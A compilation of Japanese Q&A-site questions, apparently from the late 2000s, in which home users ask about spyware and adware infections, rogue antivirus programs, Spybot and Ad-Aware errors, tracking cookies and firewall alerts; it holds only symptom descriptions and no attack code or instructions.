セキュリティに詳しい方教えてください。 WindowsXp: ウィルスバスター→ウィルス、スパイウェア検索、ファイヤウォール稼働 MacOSX: ClamXav→ウィルス検索 Netbarrier→ファイヤウォール稼働 というWinとMacを有線ローカルエリア内でクライアントとして使用していますが同時に稼働することはないので、実質スタンドアロンでルータは目の届くところにあります。サーバやファイル共有はありません。 各PCのウィルス、スパイウェア検索作業とセキュリティソフト、OSのアップデート、を欠かさず行い、ゲームソフト、ネットワークアナライザも使用しておらず、プロキシもたてていない環境ですが、各PCでのHPの閲覧状況やメール（契約プロバイダ）の盗聴はされることはあるのでしょうか？ またWAN回線において中継地にてパケット解析が行われたり、ルータにWAN側からアクセスして勝手にポートを解放されるようなことはあるのでしょうか？ もし上記のような環境での不正アクセスが可能ならば、どういった防御手段を講じるべきでしょうか？ ネット上で調べましたが、意外に大事なところに触れているサイトが見つからなかったのでご教授願います。
先日、%USERPROFILE%\Local Settings\Temp 配下を掃除しようと覗いたところ、 　4[件名A].txt 　5[件名B].txt 　7[件名C].txt 　8[件名D].txt と、過去受信したことのあるメールの件名をファイル名とした、.txt ファイルを発見しました。 ファイルの中身はメールの本文であり、ファイル名の頭には数字が振られていました。 (ファイルは4ファイルのみで、付加された数字は上記の通りです) 気になって調査したところ、.txt 化されたファイルは、.eml 形式でPCに保存してあるものでした。 しかし、.txt ファイルの更新日時に自分が何を行ったのか、すでに記憶がなく、どういった理由で作成されたファイルなのか皆目検討もつきません。 この現象についてご存知の方がいらっしゃいましたら、ご教示お願いいたします。
Win　Meを現在使用です。 先日スパイボットを１．５．２．２０にアップしました。 スパイウエアの検査は最後まで終了出来るのですが、終了後に「スパイボットが原因でKERNEL32.DLLにエラーが発生しましたスパイボットは終了します。」とアラートが出ます。問題解決には再起動して下さいと表示されます。 再起動、再インストールでも問題解決出来ません。 アップデート前のバージョンでは、この様なアラート表示は有りませんでした。 どの様に問題解決したら良いでしょうか？ ご存知の方は、出来るだけ解りやすく教えて下さい。 宜しくお願いします。
実家に一月ほど身を寄せるのですが、その間もインターネットを利用 したいと思っています（特にネットバンキング）。 ところが実家のパソコンというのが古いあまり性能のよいものでないらしく、 セキュリティ対策などもしていないようです。（親は超初心者） 私が帰省した際に、何か負担が軽く使い勝手のよい対策ソフトでも、 と思うのですが（私もほぼ初心者ですが・・） こんな場合どんなものがお勧めでしょう？ また実家が無理な場合ネットバンキングを利用したいと思ったら どこが適当でしょう？図書館などは論外ですよね？
やふーなどで検索するたびにページの左がわに広告（スポンサーサイト？）の検索結果みたいなものが表示されます。 過去ろぐやhigaitaisakuなどの掲示板をみたりしてしたんですが おそらく http://oshiete1.goo.ne.jp/qa3773509.html の方と同じ症状だと思われます。 すぱいぽっど、X－cleaner（無料版）、ウイルスバスター2008（30日体験版）などを試して原因となっているものの駆除を試みましたができませんでした。 ｘ－cleaner（有料版）なら駆除できると見たのですが、ウイルスバスターやスパイパッドで消せなかったのでそれを買ったところでできるのか不安です。 本当にｘ－Cleanerの有料版でけせるのでしょうか？ またはほかに対処方法はあるんでしょうか？ あと、 higaitaisaku.comの掲示板に質問をかきこむとき 二つログをとらないといけないみたいですが、そのログを取得すると 所々にユーザー名（本名）が入っているので、higaitaisakuに質問しづらい状態です。 このユーザー名を本名にしたくないときは、手動でログ中の本名がでてる所の1つ1つを他の名前にかえていかないとだめなんでしょうか？
インタ－ネット回線に接続すると外部に勝手に送信しようと リモ－トコンピュ－タの表示がでています，スパイウェア のソフトでも検出されず困っています，リモ－トアシスタント の利用はしたことがないので調べてみても設定はされていま せんでした，IPアドレスは海外からです，継続的にしていま すので証拠収集をしていますが，解決方法はないでしょうか 宜しくお願いします。
HPが載っていたのでクリックしたところエロサイトでした。そしてPCのウイルスソフトの関係か「危険」という表示が出てきました。そのため怖いのでそのページは閉じました。このHPをクリックしたことによって情報流失やウイルスが来たりするのでしょうか？とても怖いです。
最近ITbarlayoutというスパイウェア？が新しくウィンドウを開くたびにレジストリを変更しようとアクセスしてきます。今はspybotでブラックリストにして変更を拒否しているんですが、いくつか変な症状が出ています。 (1)複数のウィンドウを開いているとたまにフリーズっぽくなる(一時的に操作不能、しばらくすると回復) (2)お気に入りが、前は新しくウィンドウを開いてもお気に入りが出たままだったのが、今は新しくウィンドウをひらくと消えている。 (3)Yahooツールバーが勝手に出てくる(右クリックで消せるんですが、新しいウィンドウを開くとでてる) などなど。。。(3)に関してはブラックリストしてても、毎回消すたびにSpyBotの変更するかしないかというやつが出てきます。すでにいくつか同じような質問があるのですが、どうもみんなそれぞれ症状の程度が違うようで・・・自分の場合はどうしたらいいんでしょうか？
pegeon axlm　と言う名前のスパイウェアが見つかりました！！ 危険度が高いようで、怖いです。 でも、ＣＡのサイトを見たら(私はＣＡスキャンを使用したのです)、pegeon GZと言う似た名前のものなら、スパイウェアではなく、誤作動によるものなのだそうです。 でも、名前が似てるだけかもしれないし、危険度：高と出たのでとても不安です。これは誤作動なのでしょうか？それとも、似た名前の別のファイルなのでしょうか？本当に怖くて困ってしまいます。 教えてください。お願いします。
初投稿で初心者です。 Outlook Expressでメールを受信しているのですが、外国のスパムメールが多くて辟易しています。 あるPC雑誌でG-Mailを迷惑メールフィルターとして活用すれば、G-MAILに迷惑メールが溜まってOutlookの方はカットできるとあったのでそのようにしたのですが、結局両方に（OutlookにはNorton AntiSpamフォルダに）メールが来てしまいます。 何か設定方法が間違っているのでしょうか・・・。因みに通常のメールは同じ内容のメールがOutlookに２通来てしまうのです。 よろしくお願いします。
カスペルスキーについてお願いします いろいろなソフトやフリーソフト等をインストールしていますが パソコン内のプライバシー情報をどこかに送信してないか心配です カスペルスキーを使って、ネットにデータを送受信しているソフトを 検知し遮断したりできますでしょうか 設定等ありましたらご教授お願いします できればブラウザーとメーラー以外はすべてネットから遮断したいのです
デジタルカメラをPCにつないでカメラの中のデータの一部をPCに移しました。 その画像はもしかしたら流出してしまうかもしれないんでしょうか？ 一番教えていただきたいのは、先ほど移した一部のデータ以外のデータ（移してはいないがデジカメの中にはある）は流出したりして他人の手に渡ってしまう可能性はあるのでしょうか？？ ※PCでの再生や送信はしてないです 今ちょうど期限が切れてウイルスバスターが入っていません……orz 最近個人情報の流出が目立っているので不安になり質問させていただきました。
VirusHeatというアンチウィルス詐欺ソフトがパソコンにインストールされてしまいました。 安全確実に、駆除、削除したいのです。 ネットで検索しましたが、これ！という情報がありません。 情報をお持ちの方、教えていただけませんか。
Avast4 無料版を使用していますが、以前からPC使用していると突然、 Win32:Adware-gen [Adw] が検出されてサイレンが鳴り出し困っています。 何回も検出されるので煩わしくて困っています。 全スキャンすると C:\System Volume Information\_restore{3BAD5ABA-7406-4D71-BA2B-EC9C7D95584A}\RP262\A0128335.exe\%MAINDIR%\cd_install277.exe\cd_clint.dll が感染ファイルと出てきますが、削除もチェスト移動も出来ません。 1) 何も対処しない、(にチェックを入れる) で宜しいのでしょうか。 それとも、 2) 削除すべきものならば、その方法を教えて下さい。 よろしくお願いします。
ココ最近IEを立ち上げてしばらくすると、ウィンドウが半永久的に出続けます。 これってスパイウェアでしょうか？それともブラクラでしょうか？ あとできれば直し方等も教えてください。
PerfSpot（パーフスポット）というＨＰが勝手に立ち上がるようになりました。同時にカジノサイトが開いたり、ＩＥ７でＧｏｏｇｌｅ検索すると左側に空白やリンクが表示されるようになり、困っています。 ノートン３６０、ＡＤ－ＡＷＡＲＥ、ＳｍｉｔｆｒａｕｄＦｉｘを試してみましたが効果なし。 ＩＥ左側の空白については、７から６に戻すと改善されるという説があったのですが、６にしても相変わらずで効果なし…。 ほかにも同様の質問をされている方がいらっしゃって その回答を参考にしたのですが解決できません。 削除＆駆除するにはどうすればいいですか？
Spybot1.5.2.でＩＥ７の組み合わせで、ＩＥのアイコンをクリックするだけでＨＰを１つ開いてる時に新しくＩＥを起動するとＣＰＵ１００％になっていつまでも新しいＨＰが開けません。Spybot1.4の時は何枚でもＨＰ（開いてるＨＰと異なるＨＰ）を開けてたんですが、出来なくなりました。ＳＤＨｅｌｐｅｒとＴｅａＴｉｍｅｒをチェックしたままインストールしています。 現在はSpybot1.5.2を最新の免疫化をしてから削除＆インストールしなおして、ＳＤＨｅｌｐｅｒとＴｅａＴｉｍｅｒをチェック外してＩＥ６との組み合わせで使用中ですが、問題なく開いてるＨＰと異なるＨＰをＩＥのアイコンをクリックするだけで何枚でも開けるようになってます。 何が原因でSpybot1.5.2.でＩＥ７の組み合わせで不具合が出たのでしょうか。ＩＥ７-ＸＰ-ＳＰ２用には未だ不具合があるんでしょうか。 ちなみに、Kingsoftを使用中ですが、ＩＥ７だけダウンロードしてあったもの（ＳＰ２用）を入れるとマイクロソフトのアップデートがしなくなるのは、昨年にベータ版のＩＥ７を入れたときもマイクロソフトのアップデートが反応しなくなってたのと同じです。
ソースネクストのウィルスセキュリティZEROを使用中。 2006からZEROに乗り換えたところ、特定のIPアドレス「239.255.255.250」から無限アクセスが継続中。 ブロックはされていますが、ネットワーク通信の履歴が鰻登りで煩わしいことしきり。 完全にカットできないものでしょうか。
2週間ぐらい前からインターネット見ていると、ウィルスバスターの別画面が立ち上がり「このWebサイトは有害情報が含まれているのでアクセスをプロックした」旨の表示があり、そこに記されているWebサイトのURLは scanner.spyshredderscanner.com/5/?advid=2322&ref=3 となっています。カテゴリはスパイウェアです。　それを閉じてもまた立ち上がり、その時のURLは最後の数字が5や6になります。 この現象は何かの新しいプログラム(確かJAVAの新バージョンだったと思います。)を取り込んだ時から発生するようになりました。その時にspyshredderのサイトが急に出てきたので直ぐに閉じましたが、その後ウィルス検索でウィルスが2度に分けて合計3つ見つかり削除しました。また危険度の高いクッキーも1つあったのでそれも削除しました。 今のPCは正常な状態だと思われますが、「spyshredderscannerのサイトをブロックした」旨の画面は度々表れます。 一度このサイトを許可するようにしましたが、最後の数字が3のサイトの警告は出ませんが、数字が増えて行く形で何度も表れるので、切りがないと思い許可するサイトから削除しました。 情報が漏れているようなことはありますでしょうか。 また、このような状況でネット上でカード決済で買い物をしたりすることは危険でしょうか。 PCのことは詳しくないので状況が良くわかりません。 よろしくお願い申し上げます。
インターネットエクスプローラー７を導入したところブラウザの動作が重かったのでFirefoxに切り替えました。ところでこのFirefoxに、ウィルスソフトのAVG Free editionと、Windows defender、スパイウェアターミネーター、PC Clean等のソフトは対応しているのでしょうか？。よろしくお願いします。スパイウェアターミネーター公式サイト　http://www.spywareterminator.com/ PC-Clean公式サイトhttp://www.pc-clean.jp/ AVG公式サイト　http://www.avgjapan.com/
アドエスのウィルス対策に、マカフィーを検討してますが、ＰＣには、ノートンを導入しています。 ＰＣと同期する環境で、異なるセキュリティーソフトの不具合など心配です。 実際に導入されてる方の見解を、教えてください。 宜しくお願いします。
たまに、Jwordがかってにインストールされてしまうんですよ。 インストールされるたびに、アンインストールしてるんですが、かなりめんどくさいです。 あまりコンピューターに詳しくないんで、どこをどうすればインストールされないか知りたいんです。ちょっと前までは、画面の上に「Jwordをインストールしますか？」とかいう警告文が入ったのに、いつからかかってにインストールされてしまったので、どうすれば前のように戻るか教えてください。（セキュリティの設定ですかね・・・・）
ウイルスバスター2008と相性の良い、スパイウェア対策ソフトを探しています。（有料のソフト） ご存知の方がおられましたら教えて下さい。 お願いします。
先日Spybot1.4にアップデートしたところ、インストール後 PC立ち上げでいつもSpybotのフォルダーが開くようになって しまいました。 スタートアップになにも登録されてなく、設定やFAQなども 見てみたのですが、該当する項目がなく煩わしくて困っています。 解決方法が判れば教えて下さい。 宜しくお願いします。
Spybotでスキャンしても1回もウイルスが発見されません。 OSはVISTAです。 XPの時はウイルスが発見されてスキャンされたのですが・・・
教えてください。 マカフィーのネットワーク管理のところで 自分のパソコンではない他のパソコンを認識しているのですが （もちろん家族のものでもありません）これってどういった意味でしょう？ デルを使用していますが、その自分のものでないパソコンもデルで 型番が違いました マカフィーが認識するのを間違えたとかっていうのもありえますか？ ハッキングということでしょうか？ 普通にマカフィーを常駐させて、Ad-awareも定期的に使用していました。ウィンドウズアップデートもきちんとしていたので、そんなにセキュリティーは問題はないと思っていたのですが。 気づいて慌てて「そのコンピューターを信用しない」という風に 設定をしましたが手遅れ？？かなぁ～。
spybotで検索するとdouble　clickというのが何度もひっかかります。 これはレジストリですか？それともスパイウェアなのでしょうか？
スパイボットやウィルスバスター等でスパイウェアを検索して駆除しても、バックグラウンドで勝手にＩＥが起動してまたスパイウェアが入ってきてしまいます。タスクマネージャーのプロセスでIEXPLORE.exeのプロセスをいくら終了しても次々に起動します。何か対策は無いでしょうか。いきなり英語音声が再生されたりして困っています。よろしくお願いします。
スパイウエアってどういうときに感染するのですか？ ファイル開く、ソフトのインストール、WEBサイトの閲覧時ですか． ウイルスのように常駐して監視するソフトで 何かよいものはないでしょうか？
SpyBot1.4を1.5.2にUpdateしたところ、WindwsXP起動時にウィルスセキュリティーがインターネットに勝手に接続しようとする数十のアイテムを検出し、一括して接続を許可するかブロックするかと聞いてきました。 Ver1.4の時はそんなことは無かったので、この無数の接続要求はSpyBot1.5.2が行っているのだとしか考えられません。 この接続要求は何でしょうか？ これは許可すべきかそれともブロックすべきか悩んでいます。 クッキーを全部クリヤーにしても、IEのテンポラリーフォルダーを空にしても変わりません。 それからもう一つ、SpyBot1.5.2でスキャンしたら、次のようなエラーが表示されました。 “Virtumonde[60](TRegExpr(comp):ParseReg....” “Virtumonde[93](TRegExpr(comp):ParseReg....” これは何でしょうか？ それらの頭には中に！の入った赤い三角マークが付いています。 よろしくお願いします。
Window XP home editionを使っています。 古いバージョンの 二つのファイル LiveReg(Symantec Corporation) LiveUpdate1.80(Symantec Corporation) が残っていますのでこれを完全に消すには 「プログラムの追加と削除」ではなく Symantecのアンインストール方式を使わねばならないと 言われましたが、そのアンインストーラーはインターネット上 からダウンロードできるのでしょうか。
Ad-Aware SE Personalを使用しています。 最近アップデート画面が５％で止まりエラー表示になっています。 解決法を教えていただければ幸いです。
上記フリーソフトをインストールしようと思いましたが、アドウェアが同梱されている事をしりました。 又、その削除方法も下のURLから知ったのですが、 http://www.nihongoka.com/dvdbackup/daemontools_g … 最新ファイルをダウンロードし、コンポーネント選択画面までインストールを進めていくと「DAEMON Tools default Search Provider」のチェックがありません!! これをインストールしても、アドウェアにによる勝手な広告等が出ないでしょうか？又、別のウィルスに感染する可能性は無いのでしょうか？ 最近インストールした方、若しくはご存知の方いらっしゃいましたら教えてください。 因みに、OSはXP（HOME）です。
PCでネットサーフィンしていたところ、どうやらウイルスに感染してしまいました。 一年以上前になるのですが、それ以降対策をしておらず、動作もイマイチよくありません。もしかしたらまた何か別のウイルスに感染しているかもしれません。 PCを買った電気店で保証サービスに入っているのですが、そこで直してもらうことはできるでしょうか？
「kyoishusei」という見知らぬフォルダがあったので ウイルスチェックをしてみたところ、見事にひっかかったので 削除しようとおもったのですが、 「対象のフォルダへのアクセスは拒否されました」というアラートが出て、削除することができません。 対処法が解らず大変困っています。 対処法に心当たりのあるかたは回答お願いいたします。
こんにちは！XP-SP2 PENTIVです。 IE7上で右クリックすると「Jワードで検索する」という項目が出るようになってしまいました。 Jワードは使いませんが、一度だけ中国のYahooを観ました。どうもその時に入ったようです。 CnsMinRemoverを使ってもダメでした。 どうしたら良いでしょう。 宜しくお願いします。
こんばんば。無償のｓｐｙｂｏｔ-Ｓ＆Ｄ1.4を使用しています。 アップデートしましたら、別ウィンドウ（ウィザードとかの画面）で英語の文字でｓｐｙｂｏｔ-Ｓ＆Ｄのｓｅｔｕｐがでてきました。 よくわからなかったのでキャンセルにしました。そしたら黒い画面がでてきて消えるとｓｐｙｂｏｔが再起動しました。 多分downloaded update Main update 1.5.2のだったような。 これはなんでしょうか？　もしかして1.4なので1.5にアップデートしますよ。ということなのでしょうか？ お解りになられる方いましたら、教えてください。 よろしくお願いします。
Rarlab(英語)のサイトで、Winrarをダウンロードするつもりが、 誤って、そのサイト内にある「Spyware doctor」を ダウンロードする「Click here to download」をクリックしてしまいました。 この場合、「Spyware doctor」の利用料を支払わなければならないの でしょうか？ 特に、氏名、住所や支払い方法などは入力していません。 また、これをダウンロードしたことによって、何かウイルスに 感染するといったことはあるのでしょうか？ 禁止事項にもあるように、インターネットに不慣れな方への 配慮のため、そのサイトへのリンクをここに貼れませんが、 どうか何かお分かりの方、ご回答をお願い致します。
あるサイトで、今動いているOS上で別のOSを 動かすことが設定できると書いてあったのですが、 やり方までは書いてなかったので、実行する方法を教えて下さい。 PC初心者なのでできるだけ詳細に 説明していただけるとありがたいです。
KISのVer.7を使っていますが、子供が使ったあと、ふと心配になりTrend Flex Securityのオンラインスキャンをしました。そうしたら”４件のスパイウェアが見つかりました”として、 Adware_BHOT_Zipclix Adware_BestOffers Adware_Httper Adware_InternetWasher が出てきました。これらは削除してしまえばよろしいのでしょうか？（子供は別に怪しいサイトに入ったわけではありませんが。）
スパイウェアに感染したみたいです。 ネットに接続してホームページを開くと、広告部分がウイルスソフトのダウンロードみたいな画面に変わります。 書いてあることを詳しく書くと、 Warning! Your privacy data is in danger. Start full scan! 　と出て、右にダウンロード中みたいな図が書いてあります。 また、たまに英語で「あなたのコンピューターに重大な欠陥が見つかりました。ウイルスソフトをダウンロードしますか？」のような趣旨が書いてあるポップアップが出ます。 一応、ウイルスバスターとspybot S&D で二回くらいずつ検索かけて出てきたものを削除しましたが治りませんでした。 どうしたら、この問題を解決できますか？ 何か良い方法を知ってる方は是非教えてください。 よろしくお願いします。
最近ネットをしていると勝手にポップアップが出てくるようになってしまいました。 特にそういうサイトにアクセスした心当たりが無いんです・・・・ 履歴を見るとads.glispaと表示されたサイトが勝手に出てくるようです。 過去の質問など自分で少し調べてみたのですが、結局自分にあったのがどれかわからなかったので質問しました。 対処方法がわかる方教えてください。 ここに書き足りない情報があったら言ってみてください。
・スパイウェアらしきものがa-squearedで検出されます。アンインストールしても検出されます。削除できません。Trace.Registry.RewardNet.ShopGuides というのが検出されます。 なんとか除去できませんか？
「Security Toolbar 7.1」　と言うスパイウェア（ウィルス）に感染してしまって、とても困っています。 Security Toolbar 7.1の主な症状は… 英文で書いてあるエラーメッセージが度々出てくる 勝手にウィンドウが開き、変なサイトへ飛んでしまう 不明なソフトウェアをダウンロードさせようとしてくる ネットの回線速度が低下してしまう 上記の症状が5分に1回のパターンで表示されます（速度は常に低下します） Yahoo！知恵袋や当サイトなどで駆除方法を調べてみたのですが、パソコン初心者で何をどうすれば良いのか全く分かりませんでした。 とりあえず http://honyaku.yahoofs.jp/url_result?ctw_=sT,eCR … のページにSecurity Toolbar 7.1を駆除できるソフトがあるらしいのですが、そのソフトをダウンロードする場所、ダウンロードしてからの操作方法が全く分かりません。 この件に詳しい方、Security Toolbar 7.1に感染した経験があって駆除したことのある方。 どうか、駆除方法を教えてください。
スパイウェアのスキャンをしたら物凄い数のTracking Cookieがでてきました。これはすべて消去してもいいんでしょうか？調べた所によると消してはいけないものあるらしくて困ってます。パソコンの知識は全然ありません。助けてください。Tracking Cookie以外のものは削除しました。
ad-aware seをダウンロードすると、defs.zipというファイルが表示され、解凍するとdefs.refとなりますが、開こうとすると「ファイルを開くアプリケーションを選んでください」と表示されます。 これは、ファイルを開くアプリケーションがパソコン内にないということなのでしょうか？どのようなアプリケーションが必要なのでしょうか？よろしくお願いします。
スパイウエア検索除去ソフト「ＡＶＧ」を使用しています。 ２日ほど前からブラウザを起動する度に 「Ｔｈｅｓｔｓ　Ｄｅｔｅｓｔｅｄ」　と表示しましたので、スキャンをかけると Ｔｅｓｔ　Ｒｅｓｕｌｔ　で Ｔｈｅｓｔｓ　Ｆｏｕｎｄ　４ と表示しますが、ムーブ・デリートなどの対応ができていません。 以前として 「Ｔｈｅｓｔｓ　Ｄｅｔｅｓｔｅｄ」 を表示して、×２回で消えます。 ブラウザは正常動作しており使用に問題はないようです。 エラーファイルは　￥wpad[1].html のようです。 直接削除しようと 検出されたファイルをエクスプローラーで 検索して削除しました。 強制削除プログラム　ForceRecycleBin.exe で一時的に削除できるように見えますが 再読込すると消えていません。 どなたか詳しい方、アドバイスを御願いします。 ＯＳはＸＰ、ネットはＡＤＳＬで、通信は正常です。 ＡＶＧは　７．５　５１６　日本語にアップしましたが 表示が日本語になっただけで変わりませんでした。 よろしく御願いします。
スパイウェア対策に、AD-AWARE 2007 Freeを入れたのですが、なるべくドライブの容量を空けたいので、 無料だと使えない、Ad-Watch等のソフト、ファイルを削除したいのですが、どのようにしたら良いか知らないでしょうか。 ＷＩＮＸＰ、スパイウェア関係でノートン、SpywareBlasterが入ってます。
スパイウェア駆除ソフトでスキャンするとTracking Cookieというものが検出され、よく分からなくて検索していると下記のページを見つけました。 Tracking Cookieの恐ろしさ http://www.netpub.tsuzuki.yokohama.jp/security/s … だいたい分かってきたのですが、真ん中くらいの「３．無料の会員制サイトの落とし穴」というところで、「★この時、これらの情報がバナー広告企業へ送信され記録されるからです。」と書いてあるのがよく理解できません。 これはどういうことなんでしょうか？　会員制サイトで入力した氏名やメールアドレスなどの個人情報がバナー広告企業に流れるということはあり得るんでしょうか？ よろしくお願いします。
windows meを 使っているのですが、アンチスパイウェアソフトのスパイボットをインストールするときに、エラーが出てできません。 たぶん、インストールするときにスパイボットのホームページにアクセスすると 思うのですが、インターネットに接続できないのが原因と思われます。 （他のソフトで定義ファイルをアップデートしようとしたらサーバーが見当たりませんとエラーメッセージがでました。） 普通にインターネットエクスプロラーを起動すると、何も問題はないのです。 プロバイダーはＯＣＮで、回線は光フレッツです。 誰か教えてください。お願いします。
初めて質問させてもらいます、このたび共有ファイルから映像をダウンロードしたんですが、それと一緒にスパイウェアも付いてきたみたいで、気づかずにそのスパイウェアが入ったファイルをクリックしたと思うんですがそれからYahooやGoogleなどの検索エンジンの横に英語で変な文字が出るようになったんです。マイシールドでスパイウェアの駆除をして、システムの復元というのもしたのですが、まだ出たままです。 一体どうゆう作業をすればこの検索エンジンの横の変な文字を消すことが出来るんでしょうか？僕はパソコンは初心者に近いので出来れば噛み砕いた説明をよろしくお願いします。
先日、ノートンのセキュリティソフトでスキャンを行ったところ、 「Hacktool.Rootkit」が検出されました。 結果は削除に成功したとの履歴がありましたが、 その後、内蔵されているリカバリプログラムを利用して リカバリしました。 このような状態の場合、 「rootkit」は完全に削除されている状態であると認識してもよいのでしょうか？ もし内臓のリカバリプログラムが 「rootkit」が残されるよう改変されていたとしたら、、 とか考えるとちょっと心配です。 よろしくお願いします。
SPYBOT1.5.1.15を使っていますが、パソコンの起動時にレジストリィに変更を加えようとしています。というようなメッセージが出ます。 レジストリィの値は HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SessionManager にある BootExecute という値を削除しようとしているようです。 これは正常な作動でしょうか？ 最近、ウイルスに感染したようで、あらかた削除したのですが、この動きが怪しくて心配です。 大量に感染していたウイスルは　Win32.OnlineGame というようなウイスルでした。
spybotでスパイウェアが検出されたけど、どれを消していいかわかりません。 ちなみに・・・ AdRevolver 1エントリ CasaleMedia　2エントリ DoubleClick　2エントリ ErrorSafe　2エントリ FastClick　2エントリ HitBox　5エントリ IESeach ToolbarHelper.vbs　2エントリ LinkSynergy　3エントリ MediaPlex　3エントリ statcounter　1エントリ TagASaurus　3エントリ WebTremdslive　3エントリ Zedo　4エントリ こんなにたくさんあるので、心配になのですが・・・ どなたか、教えていただけないでしょうか？ 全て削除した方が、良いでしょうか？
Spybotでスキャンしていたときに、スキャン途中で、 警告 includeファイルに問題があります C:\Program Files\Spybot - Search_Destroy\Includes\Trojans.sbi 詳細は'Include errors.log'を確認してください。 と出てきました。2回目スキャンしてももでてきました。 どうしたらよいのでしょうか？
WinAntiＶirus pro2006をダウンロードしてしまいました。 yahooで調べたら、スパイウェアソフトとのことです。 個別に削除したのですが、ウィンドウズ内のファイルが開けなくなりました。（コントロールパネル内のアプリケーションの削除のアイコンを クリックしてもひらけない等、ファイルのプロパティを見ると種類が 「コントロールパネル」というのになってる） あまり、パソコンに詳しくなく途方にくれてます。 どなたか、対処法を教えていただければ幸いです。
最近、Spybot・Ad-Aware・WindowaDefender等、様々なスパイウェア対策ソフトがありますが、これらは複数インストールしていても大丈夫なのでしょうか？また、これはインストールしておいたほうがいいというおすすめのソフトは、ありますか？教えてください。よろしくお願いします。
PC初心者です。 ボット対策として、localhostが「127.0.0.1 localhost」だけであればよい、というのを読み、試してみたところ、 「127.0.0.1 localhost 　::1 localhost」 と出てしまいました。 CCIクリーナーや、ウィルス対策ソフト（Norton Internet Security2007)、Ad-Aware2007、ライブワンケアPCセーフティ（オンラインスキャン）も試してみましたが、 特になにも見つからず、 Spybotをいれてみたところ（スキャンの結果は、Sogouというのが見つかりましたが、修正し、PCを再起動しました）、 上記のものに、さらに 「# Start of entries inserted by Spybot - Search & Destroy」 が追加され、その後「127.0.0.1」のあとにURLのついたものがたくさんに追加されてしまいました。 「::1 localhost」については、 http://ja.wikipedia.org/wiki/Localhost というのを見つけましたが、 やはり、これはボットなのでしょうか。 自分なりに探してはみたのですが、よくわかりません。 どのスキャンにもひっかかってこないので、 どのようにしたらいいのか、全くわかりません。 そして、 spybotはこのまま使い続けたほうがよろしいでしょうか。 環境は、 Windows Vista（HPのノート） セキュリティソフトは、上記のとおり。 ほかに必要な情報はありますか？ とても困っています。 よろしくお願いいたします。
差出人 ： hfbkyqpwqnnn@yahoo.cn 題名 ： (no subject) 内容： このような迷惑メールが届きました。 内容は、一切ありませんでした。 ＯＵＴＬＯＯＫでは、これらのメッセージ等何らかの表示はありません。 不信に思いセキュリティーソフトで解析すると・・・。 一度開封すると、自動的に「開封要求がきています」となり、開封返信が実行する様になっていました。 直ぐに迷惑メール及び受信拒否対応をしたのですが、同じ経験がある人はいますか？
今年、ノートＰＣ（ＮＥＣ、ＬＬ８００/ＫＧ）でケーブル（東急ケーブル）のインターネットを開始した全くの初心者です。 毎回、接続中に無線ＬＡＮパトロールで未承認のＰＣ情報（種類はルータ）が表示されます。表示の度に接続を拒否する場合には…の指示通りに例外ルールを追加するボタンを押すのですが、今後拒否するためには…の解説にある、追加プロファイルの作成手順の説明が理解出来ません。（例外ルールとかプロトコルとか開いてはみるのですが、拒否したいＩＰやＭＡＣを入力する画面がまでたどり着けません。） 実際問題として、私のＰＣが覗かれている可能性があるのかと、拒否設定手順を教えて下さい。
spybotで検索をしたところ、以下のものが検出されました。 「click bank」 「Hit Box」 「Media plex」 「Web Trends」 「Double click」 「cyber Defendar」 これらのものは削除したほうが良いでしょうか？ 環境ですが、ウイルスバスター２００８を使用しています。 ＯＳはＸＰです。 どうぞ宜しくお願い致します。
spybotで検索をかけたところ、「cyber Defender」というものが検出されました。 これは削除したほうが良いですか？
最近、検索して出てきたいくつかのひとつをクリックすると必ず Spankspam.comのページへ行きます。 戻して再度クリックすると普通に検索したページに行きます。 Spankspam.comじゃなく違うページへ誘導されるときもあります。 何かウィルスに侵されてるのでしょうか。 対策方法があればお教え頂きたいと思います。 よろしくお願い申し上げます。
スパイウェアスキャンXoftSpySEでVender「Agent Trojan」が２ヶ所検出され、それぞれObject「assistant.3721.com」「ダブルダブルダブル.3721.com」とスキャンできましたが、どうしたら削除できるかわかりません(ダブルダブルダブルはwwwです。クリックできないように表記しました）。 よろしくお願いします。
ウイルスバスター2008を使っています。 ウイルスバスターのウイルス、スパイウェアの検索では何も見つからなかったのですが、spybotで検索をしてみたら以下のものが見つかりました。 CnsMin ８エントリ Hotbar 1エントリ Hachimitsu-Lemon １エントリ これらのものは削除したほうが良い物ですか？ 家にもう一台パソコンがあり、やはりウイルスバスター2008を入れているのですが、こちらもspybotで検索をかけたほうが良いのでしょうか？ またウイルスバスターで定期的に検索をするだけでは不十分なのでしょうか？ ちなみにOSはXPです。 よろしくお願い致します。
Spybot1.4からSpybot1.5になりましたが、まだ1.4もアップデートは出来るでしょうか？ よろしくお願いします。
インターネットサギウォール（セキュアブレイン社）を使用しているのですが、最近になってタスクトレイとサギウォールのツールバーに表示があるべきものが無い事に気が付きました。 この状態はサギウォールは機能していないそうですので問い合わせていろいろ検証してみました。 がどうしても原因がわからず、当方のＰＣのシステムファイルを送りましたところ「スパイボットがサギウォールの起動に影響を及ぼしているのではないか」との回答を頂きました。 一旦スパイボットをアンインストール叉は機能を停止した上での検証を薦められましたがスパイボットの監視等全ての機能を他のセキュリティーソフトのように一時停止することは可能でしょうか？
常駐はマカフィーを使っています。スパイウェア対策でSpybotとAd-Aware 2007（フリー）を使っています。最近外付けＨＤを購入したので、ダウンロードしたファイルはマカフィーでいったんスキャンした後、外付けＨＤに保存しています。外付けＨＤ購入前はマカフィーで検出できなかったものでも、SpybotやAd-Aware で検出されることもありましたので重宝していたのですが、SpybotやAd-Aware（フリー） は外付けＨＤ内のファイルもスキャンできるのですか？
自宅のＰＣではadaware,spy-botなどを使用してスパイウェア対策をしているのですが、会社のＰＣ環境では上記２つのソフトが実行できないようにネット通信制限がかけられているようです。 (1)ネット接続なしでスパイウェアが駆除できるソフトは無いでしょうか？ (2)他のＰＣでスパイウェアを外付けＨＤＤにＤＬし、アプリ起動→アップデートを行う→会社のＰＣにＨＤＤを接続→スパイウエァ駆除ソフト起動・・・こんな方法は不可能でしょうか？ よろしくお願いします。
たった今会員登録しました。これからお世話になります。どうぞよろしくお願いいたします。 早速ですが、ぷららを通してウイルスバスター月額版を入れていたのですが、スパイウエアに感染し、削除できなくなりました。仕方がなくリカバリーしたのですが、ウイルスバスターのシリアル番号が控えることができませんでした。登録してあるメールアドレスも使えない状況で問い合わせもできなくなってしまったのですが、シリアル番号を知る方法があれば教えていただきたいのですが。ぷららの会員番号も不明のため、ぷららからも調べることができなくて困ってます。 何か方法をご存じの方がいらっしゃたら教えてください。よろしくお願いします。
